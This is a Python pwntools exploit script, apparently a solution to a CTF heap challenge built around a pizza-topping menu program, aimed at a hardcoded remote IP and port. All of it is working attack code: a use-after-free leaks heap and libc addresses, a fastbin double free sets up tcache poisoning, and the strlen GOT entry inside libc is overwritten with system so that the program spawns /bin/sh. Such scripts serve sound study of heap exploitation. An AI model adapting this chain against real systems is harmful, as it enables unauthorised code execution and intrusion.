from pwn import *
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

elf = ELF("chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

IP, PORT = "34.70.212.151", 8007

# tbreak
gdbscript = '''
init-pwndbg
'''

# ----- Shortcuts ----- #
# return data between d1 and d2. Stole this from another CTFer
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  if (d2):
    return p.recvuntil(d2,drop=True)

if args.GDB:
    p = process('./chal_patched')
    gdb.attach(p, gdbscript)
elif args.REMOTE:
    p = remote(IP, PORT)
else:
    p = process([elf.path])

v7 = ["Tomato", 'Onion', 'Capsicum', 'Corn', 'Mushroom', 'Pineapple', 'Olives', 'Double Cheese', 'Paneer', 'Chicken']

def menu():
    p.recvuntil(b"5. Bake Pizza")

def add(idx, size):
    menu()
    p.sendlineafter(b'Enter your choice : ', b'1')
    p.sendlineafter(b'Which topping ?\n', v7[idx].encode())
    p.sendline(str(size >> 3).encode())

def customize(idx, content):
    menu()
    p.sendlineafter(b'Enter your choice : ', b'2')
    p.sendline(v7[idx].encode())
    p.send(content)
    sleep(0.3)
        
def free(idx):
    menu()
    p.sendlineafter(b'Enter your choice : ', b'3')
    p.sendline(v7[idx].encode())
    
def view(idx):
    menu()
    p.sendlineafter(b'Enter your choice : ', b'4')
    p.sendline(v7[idx].encode())
     
def free_all():
    menu()
    p.sendlineafter(b'Enter your choice : ', b'5')

# ---------- Exploit ---------- #

##### leak heap #####
add(0, 0x80)
free(0)
view(0)
p.recvuntil(b'Which topping to verify ?\n')
heap = u64(p.recv(5).ljust(8, b'\0')) << 12
log.success(f"Heap @{hex(heap)}")

##### leak libc #####
# allocate 8 chunks
for i in range(8):
    add(i, 0x80) # <- size 0x80 to put it in unsorted bin
add(8, 0x20) # little space to avoid chunk 7 getting merged with top chunk
for i in range(7):
    free(i)

# put chunk 7 in unsorted bin
free(7)

view(7) # leak ptr to libc main_arena

p.recvuntil(b'Which topping to verify ?\n')
libc.address=u64(p.recv(6).ljust(8, b'\0'))  - 0x219ce0
log.success(f"Libc @{hex(libc.address)}")

##### use the double free to put a chunk twice into fastbin #####
for i in range(9):
    add(i, 0x40) # <- results in size of 0x50 which is <= 0x80. We need that for them to be sorted into the fastbin
# fill tcache size 0x50
for i in range(7):
    free(i)

# trigger double free
free(7)
free(8)
free(7)

# empty tcache 0x50
for i in range(7):
    add(i, 0x40)

# take out our double freed chunk from fastbin
add(0, 0x40)
add(1, 0x40)
add(2, 0x40)

# free the other chunk so we have 2 chunks in the tcache to successfully perform tcache poisoning
free(1)

# free the victim chunk using the first ptr
free(0)

##### We now have everything we need for tcache poisoning #####
# Our plan is to overwrite the GOT of __strlen_avx2 inside libc with system.
# The function is internally called by puts.
# And we can control what puts is being called on using the view option.
strlen_got = libc.address + 0x219098 - 0x18 # <- this actually points 0x18 bytes before strlen GOT entry

# use the second existing pointer to modify the freed chunk
target = strlen_got
chunk_addr = heap + 0x930 # tcache requires the address to point to the chunks data section
log.info(f"vitim chunk @ {hex(chunk_addr)}")

# overwrite next pointer of victim chunk
customize(2, p64(target ^ chunk_addr >> 12))

# perform tcache poisoning
pause()
add(0, 0x40)
add(1, 0x40) # <- points to strlen_got

customize(0, b"/bin/sh\x00")

customize(1, b"A" * 0x18 + p64(libc.sym["system"])  )

view(0)

p.interactive()